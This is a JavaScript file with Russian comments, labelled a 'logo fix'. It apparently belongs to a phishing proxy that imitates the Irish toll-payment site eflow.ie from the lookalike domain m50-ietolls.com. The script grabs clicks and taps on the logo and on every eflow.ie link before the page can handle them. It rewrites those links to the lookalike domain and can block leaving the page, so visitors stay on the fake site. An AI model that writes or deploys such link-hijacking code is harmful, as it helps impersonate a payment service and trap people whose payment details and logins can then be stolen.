/**
 * Logo Fix Script v3.0 - AGGRESSIVE MOBILE FIX
 * Перехватывает ВСЕ клики/тачи на логотип независимо от href
 * 
 * КЛЮЧЕВЫЕ ИЗМЕНЕНИЯ:
 * 1. Не проверяем href - всегда перехватываем логотип
 * 2. Touch события в capture phase (раньше всех)
 * 3. Блокируем navigation через beforeunload
 * 4. Inline стили для предотвращения CSS редиректов
 */
(function() {
  'use strict';
  
  // Конфигурация
  const PROXY_DOMAIN = 'm50-ietolls.com';
  const PROXY_ORIGIN = 'https://m50-ietolls.com';
  const TARGET_DOMAIN = 'eflow.ie';
  
  console.log('[LogoFix v3.0] Initializing - AGGRESSIVE MOBILE FIX');
  
  /**
   * КРИТИЧНО: Заблокировать навигацию на eflow.ie
   * Работает как последний рубеж защиты
   */
  let navigationBlocked = false;
  
  window.addEventListener('beforeunload', function(e) {
    // Проверяем куда идёт навигация (если можем)
    // К сожалению, нельзя надёжно определить целевой URL в beforeunload
    // Но можем заблокировать если была попытка навигации на eflow.ie
    if (navigationBlocked) {
      e.preventDefault();
      e.returnValue = '';
      return '';
    }
  });
  
  /**
   * Функция для определения, является ли элемент логотипом
   * ТОЛЬКО точные селекторы - НЕ все ссылки!
   */
  function isLogoElement(element) {
    if (!element) return false;
    
    // Найти ближайшую ссылку
    const link = element.closest('a');
    if (!link) return false;
    
    // ТОЧНЫЕ проверки - только реальный логотип
    if (link.getAttribute('rel') === 'home') return true;
    if (link.classList.contains('site-logo')) return true;
    
    // Проверить по img внутри
    const img = link.querySelector('img');
    if (img) {
      const alt = (img.alt || '').toLowerCase();
      const src = (img.src || '').toLowerCase();
      // Только если img имеет alt="Home" или src содержит logo файл
      if (alt === 'home' || src.includes('logo.svg') || src.includes('logo.png') || src.includes('logo-white')) return true;
    }
    
    // НЕ считаем логотипом просто ссылки на "/" в header!
    return false;
  }
  
  /**
   * ГЛАВНЫЙ ОБРАБОТЧИК - перехват ВСЕХ событий на логотипе
   */
  function handleLogoInteraction(e) {
    if (!isLogoElement(e.target)) return;
    
    console.log('[LogoFix v3.0] Logo interaction detected:', e.type);
    
    // КРИТИЧНО: Полная блокировка события
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    
    // Если это touch событие, не делаем навигацию сразу (ждём touchend)
    if (e.type === 'touchstart') {
      e.target._logoTouchStarted = true;
      return false;
    }
    
    // touchend или click - делаем навигацию
    if (e.type === 'touchend' || e.type === 'click') {
      // Проверяем что это реальный тап (а не scroll)
      if (e.type === 'touchend' && !e.target._logoTouchStarted) {
        return false;
      }
      e.target._logoTouchStarted = false;
      
      console.log('[LogoFix v3.0] Navigating to:', PROXY_ORIGIN + '/');
      window.location.href = PROXY_ORIGIN + '/';
      return false;
    }
    
    return false;
  }
  
  /**
   * Установить обработчики на логотип
   */
  function setupLogoHandlers(logo) {
    if (!logo || logo._logoFixApplied) return;
    
    console.log('[LogoFix v3.0] Setting up handlers for logo');
    
    // Пометить что обработали
    logo._logoFixApplied = true;
    logo.setAttribute('data-logo-fixed', 'v3');
    
    // Установить правильный href
    logo.href = PROXY_ORIGIN + '/';
    logo.setAttribute('href', PROXY_ORIGIN + '/');
    
    // Удалить все inline обработчики
    logo.removeAttribute('onclick');
    logo.removeAttribute('ontouchstart');
    logo.removeAttribute('ontouchend');
    logo.removeAttribute('onmousedown');
    logo.removeAttribute('onmouseup');
    
    // Добавить CSS для предотвращения дефолтного поведения
    logo.style.touchAction = 'manipulation';
    logo.style.webkitTouchCallout = 'none';
    logo.style.webkitUserSelect = 'none';
    logo.style.userSelect = 'none';
    
    // CAPTURE PHASE - перехватываем РАНЬШЕ всех других обработчиков
    const options = { capture: true, passive: false };
    
    logo.addEventListener('click', handleLogoInteraction, options);
    logo.addEventListener('touchstart', handleLogoInteraction, options);
    logo.addEventListener('touchend', handleLogoInteraction, options);
    logo.addEventListener('mousedown', handleLogoInteraction, options);
    
    // Также обработать изображение внутри
    const img = logo.querySelector('img');
    if (img) {
      img.addEventListener('click', handleLogoInteraction, options);
      img.addEventListener('touchstart', handleLogoInteraction, options);
      img.addEventListener('touchend', handleLogoInteraction, options);
      img._logoFixApplied = true;
    }
    
    console.log('[LogoFix v3.0] Logo handlers installed successfully');
  }
  
  /**
   * Найти и обработать все логотипы
   */
  function findAndFixLogos() {
    // Селекторы для логотипа
    const selectors = [
      'a[rel="home"]',
      'a[title="Home"]',
      'a.site-logo',
      'a.logo',
      'a.navbar-brand',
      'header a:first-of-type',
      '.site-branding a',
      '#logo a',
      '.logo-wrapper a'
    ];
    
    let fixed = 0;
    
    selectors.forEach(selector => {
      try {
        document.querySelectorAll(selector).forEach(el => {
          if (!el._logoFixApplied) {
            setupLogoHandlers(el);
            fixed++;
          }
        });
      } catch(e) {
        // Игнорируем ошибки селекторов
      }
    });
    
    // Также найти по img с alt="Home" или src содержащим logo
    document.querySelectorAll('a img[alt="Home"], a img[src*="logo"]').forEach(img => {
      const link = img.closest('a');
      if (link && !link._logoFixApplied) {
        setupLogoHandlers(link);
        fixed++;
      }
    });
    
    return fixed;
  }
  
  /**
   * Глобальный перехват кликов - ЗАПАСНОЙ вариант
   */
  function globalClickInterceptor(e) {
    const link = e.target.closest('a');
    if (!link) return;
    
    const href = link.href || link.getAttribute('href') || '';
    
    // Перехватываем ВСЕ ссылки ведущие на eflow.ie
    if (href.includes(TARGET_DOMAIN) || href.includes('www.' + TARGET_DOMAIN)) {
      console.log('[LogoFix v3.0] Intercepted eflow.ie link:', href);
      
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      
      // Исправляем URL
      const fixedUrl = href.replace(
        new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\.'), 'gi'),
        PROXY_ORIGIN
      );
      
      window.location.href = fixedUrl;
      return false;
    }
  }
  
  /**
   * Установить глобальные обработчики
   */
  function setupGlobalInterceptors() {
    // CAPTURE PHASE на document - перехватываем ВСЁ
    const options = { capture: true, passive: false };
    
    document.addEventListener('click', globalClickInterceptor, options);
    document.addEventListener('touchend', globalClickInterceptor, options);
    
    console.log('[LogoFix v3.0] Global interceptors installed');
  }
  
  /**
   * MutationObserver для динамического контента
   */
  function setupObserver() {
    const observer = new MutationObserver(() => {
      findAndFixLogos();
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
    
    console.log('[LogoFix v3.0] MutationObserver started');
  }
  
  /**
   * Инициализация
   */
  function init() {
    console.log('[LogoFix v3.0] Starting initialization...');
    
    // 1. Найти и обработать все логотипы
    const fixed = findAndFixLogos();
    console.log('[LogoFix v3.0] Fixed logos:', fixed);
    
    // 2. Установить глобальные перехватчики
    setupGlobalInterceptors();
    
    // 3. Запустить observer
    if (document.body) {
      setupObserver();
    }
    
    // 4. Повторить через интервалы (для динамического контента)
    setTimeout(findAndFixLogos, 100);
    setTimeout(findAndFixLogos, 500);
    setTimeout(findAndFixLogos, 1000);
    setTimeout(findAndFixLogos, 2000);
    
    console.log('[LogoFix v3.0] Initialization complete');
  }
  
  // Запуск
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  
  // Также при полной загрузке
  window.addEventListener('load', () => {
    findAndFixLogos();
    console.log('[LogoFix v3.0] Load event - final check complete');
  });
  
})();
